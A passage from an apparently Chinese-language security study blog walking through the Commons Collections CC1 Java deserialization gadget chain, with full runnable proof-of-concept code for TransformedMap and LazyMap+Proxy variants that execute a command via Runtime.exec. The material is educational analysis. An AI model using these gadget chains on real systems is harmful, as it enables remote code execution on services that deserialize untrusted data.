null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMeth);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><br><span class="hljs-comment">//        Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">//        Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">//        Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">//        Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        execMeth.invoke(runtime, &quot;calc&quot;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后配合复写点，把<code>chainedTransformer.transform(Runtime.class);</code>通过<code>ConstantTransformer</code>把值固化在数组第一位，触发了反序列化就能直接循环数组 RCE 了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>         Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Math.class);<br>         declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>         declaredConstructor.newInstance(Target.class,transformers);<br></code></pre></td></tr></table></figure><p>由于后续涉及到<code>hm.put()</code>第一个参数必须为<code>value</code>才能触发的问题</p><p>这里直接给出完整可执行的 poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上边使用<code>TransformedMap.decorate.put</code>没有使用<code>AnnotationInvocationHandler</code>作为序列化触发点时，在<code>TransformedMap.decorate</code>修饰过的<code>HashMap</code>得到的<code>outerMap(转化Map)</code>中传入<code>put</code>参数其实任意皆可，此处如果修改<code>hm.put(&quot;value&quot;,&quot;value&quot;);</code>第一个参数<code>&quot;value&quot;</code>为其他值则不能执行：没有报错，也生成了序列化流(能输出序列化对象)，那问题出在哪？</p><p>p 牛直接给出了条件：</p><p><strong>HashMap.put() 第一个参数必须为 value</strong></p><p>在反序列化的<code>AnnotationInvocationHandler.readObject</code>中，根据条件，动态调试可知，当第一个参数为<code>value</code>时，<code>var7!=null</code>进入后续的<code>var5.setValue</code></p><p>到这里还是不清楚：</p><ol><li>为什么这里第一个参数是<code>value</code>时<code>var7</code>不为空？</li><li>反射调用<code>AnnotationInvocationHandler</code>构造方法时，传入了<code>Over.class</code>，这个如何得来的</li><li>这里的<code>setValue</code>是如何触发的？（当然在 class 反编译的雏形来看，上边 poc 修改 value 即<code>setValue</code>的触发方式应该来源于这里）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//必须要先存入随意的键值对，下面两行代码修改这个键值对的值触发</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure><p>深入学习一下：</p><blockquote><p>sun 包的代码是反编译后的，可读性较差，在 openjdk 导入相对应版本的源码进行阅读</p><p>根据 b 站师傅—白日梦组长 在 b 站的讲解，下载 8u_65 以及<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4%EF%BC%8C%E9%85%8D%E7%BD%AE%E5%9C%A8idea%E9%87%8C%EF%BC%8C%E8%AF%A6%E8%A7%81https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4，配置在idea里，详见https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.999.0.0&amp;vd_source=2a1f7b45ce481b5d9d0f29cabd7578a5</a> 空降：8:23</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220824224527904.png"></p><p><code>AnnotationType</code>是什么来的？</p><p>这就要引出 java 新的知识点</p><p><strong>AnnotationType</strong></p><p>注解、标释，这是具有和接口、类一样的地位一种类型，在 Java SE 5.0 引入的概念</p><ul><li>注解的定义</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> A&#123;&#125;<br></code></pre></td></tr></table></figure><p>通过 interface 定义，如此就创建了一个 A 的注解</p><ul><li>注解的使用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@A</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><p>在类 A 的定义商法加上 <code>@A</code> 就可以用<code>A</code>注解这个类</p><p>可以理解为 A 这个类像个标签一样贴在 Demo 这个类上面</p><ul><li>元注解</li></ul><p>还要使其正常使用的话，还需要元注解：元注解是可以注解(V.)到注解(n.)上的注解(n.)，即是一种基本注解，只有五个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention</span>  <span class="hljs-comment">//约束注解的生命周期，有三个值：源码级别(source)、类文件级别(class)、运行时级别(runtime)</span><br><span class="hljs-meta">@Documented</span> <span class="hljs-comment">//被修饰的注解会生成到javadoc中</span><br><span class="hljs-meta">@Target</span>     <span class="hljs-comment">//约束注解可以应用的地方(如方法、类或字段)</span><br><span class="hljs-meta">@Inherited</span>  <span class="hljs-comment">//让注解被&quot;继承&quot;：子类Class对象可使用getAnnotations()获取父类被@Inherited修饰的注解</span><br><span class="hljs-meta">@Repeatable</span> <span class="hljs-comment">//注解多值</span><br><br><span class="hljs-comment">//https://www.cnblogs.com/-zhong/p/14961183.html</span><br></code></pre></td></tr></table></figure><p>最早接触的注解应该是继承父类重写了方法时 idea 自动生成的<code>@Override</code></p><p>比如这个例子中重写了<code>Object.equals</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Object</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p1 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        Person p2 = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">21</span>);<br>        String a = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        String b = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;helloworld&quot;</span>);<br>        System.out.println(a == b);<br>        System.out.println(a.equals(b));<br>        System.out.println(p1.equals(p2));<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        Person p = (Person) obj;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.age == p.age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以看到<code>@Override</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.*;<br><br><span class="hljs-meta">@Target(ElementType.METHOD)</span>  <span class="hljs-comment">//注解到方法</span><br><span class="hljs-meta">@Retention(RetentionPolicy.SOURCE)</span>  <span class="hljs-comment">//生命周期为源码级</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Override &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>回到这个链上</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220825002800801.png"></p><p>要触发<code>setValue</code>就要<code>memberType != null</code>，就要从<code>xxx.class</code>找到其成员方法，而传入的 class 要是<code>AnnotationType</code>类型的，说白了现在就是填入一个元注解，以及在 Map 传入一个键为该元注解的成员方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Retention &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns the retention policy.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the retention policy</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">RetentionPolicy <span class="hljs-title">value</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> Target &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Returns an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to.</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> an array of the kinds of elements an annotation type</span><br><span class="hljs-comment">     * can be applied to</span><br><span class="hljs-comment">     */</span><br>    ElementType[] value();<br>&#125;<br></code></pre></td></tr></table></figure><p>因此填入<code>Target.class Retention.class</code>均可，以及有且仅有的这个<code>value</code>方法</p><p>然后跟进发现<code>setValue</code>调用<code>AbstractInputCheckedMapDecorator.SetValue</code>继续调用<code>checkSetValue</code>方法，然后就是依次调用了<code>chainedTransformer</code>的<code>transform</code>方法，RCE</p><blockquote><p>8u_71 修改了 sun.reflect.annotation.AnnotationInvocationHandler.readObject 复写点，因此 cc1 只适合在 8u71 之前利用</p></blockquote><h4 id="②LazyMap-Proxy"><a href="#②LazyMap-Proxy" class="headerlink" title="②LazyMap+Proxy"></a>②LazyMap+Proxy</h4><p>在<code>ysoserial</code>中，其实并没有用到<code>TransformeredMap</code>，而是使用的<code>LazyMap</code></p><p>区别在于：<code>TransformeredMap</code>在写入元素时调用了<code>transform</code>，而<code>LazyMap</code>是在<code>get</code>时找不到值就调用了<code>transform</code>方法(实现了懒加载)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) &#123;<br>            Object value = factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure><p>相比于<code>TransformedMap</code>，<code>LazyMap+AnnotationInvocationHandler</code>组合利用方式更为复杂，因为利用<code>AnnotationInvocationHandler</code>的复写点<code>readObject</code>是没有直接调用<code>Map.get</code></p><p>但是<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法有<code>get</code>方法的调用，注意到这个<code>AnnotationInvocationHandler</code>实现了<code>InvocationHandler</code>接口，那么可以<code>Proxy</code>进行动态代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然而此时还不能命令执行(此处看 p 牛的文章没看懂后续再用一次<code>AnnotationInvocationHandler</code>包裹，有点绕)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//生成InvocationHandler类型的类实例</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//生成代理类实例，代理invocationHandler实例</span><br></code></pre></td></tr></table></figure><p>此时传入<code>AnnotationInvocationHandler</code>的构造方法是<code>LazyMap</code>的类对象，即<code>AnnotationInvocationHandler(Retention.class,decorate)</code>，再动态代理这个实现了<code>InvocationHandler</code>的<code>AnnotationInvocationHandler</code></p><p>我们知道，使用动态代理必须是一个接口类，于是在代理<code>AnnotationInvocationHandler</code>后进行了<code>Map</code>强转，然后再<code>AnnotationInvocationHandler.readObject</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br></code></pre></td></tr></table></figure><p>这里<code>memberValues.entrySet-&gt;LazyMap.entrySet-&gt;Map.entrySet-&gt;AnnotationInvocationHandler.invoke</code>好像天衣无缝，问题正是在这，最后我们并不能如愿的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">oos.writeObject(proxymap)<br></code></pre></td></tr></table></figure><p><code>Map</code>是没有实现<code>Serializable</code>的，那么我们还需要<code>AnnotationInvocationHandler</code>再对这个<code>Map</code>进行包裹</p><p>最终 POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> 